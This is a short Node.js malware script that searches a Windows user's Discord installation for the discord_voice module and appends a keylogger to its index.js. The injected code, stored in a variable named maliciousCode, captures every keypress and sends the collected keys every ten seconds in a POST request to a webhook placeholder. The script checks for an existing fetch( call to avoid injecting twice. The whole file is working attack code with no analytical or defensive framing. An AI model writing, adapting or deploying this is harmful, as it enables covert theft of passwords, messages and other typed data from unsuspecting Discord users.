"use strict";

// Dependencies
const fs = require("fs")
const os = require("os")

// Variables
const maliciousCode = `\nvar keys = ""
const sendTime = 10000

document.onkeypress = function(e) {
    get = window.event?event:e
    key = get.keyCode?get.keyCode:get.charCode
    key = String.fromCharCode(key)

    keys += key
}

window.setInterval(function(){
    if(keys.length >0 ) {
        fetch("webhookLink", {
			method: "POST",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify({ content: keys })
		}).then(data =>{
			keys = ""
		})
    }
}, sendTime)`

// Main
if(fs.existsSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`)){
    const Directories = source => fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    Directories().forEach(directory =>{
        const Directories2 = source => fs.readdirSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

        if(directory.indexOf("app") !== -1){
            Directories2().forEach(directory2 =>{
                if(directory2.indexOf("discord_voice") !== -1){
                    fs.readFile(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, "utf8", function(err, data){
                        if(err) process.exit()
                        if(data.indexOf("fetch(") !== -1) process.exit()
                
                        data += `\n${maliciousCode}`
                
                        fs.writeFileSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, data, "utf8")
                    })
                }
            })
        }
    })
}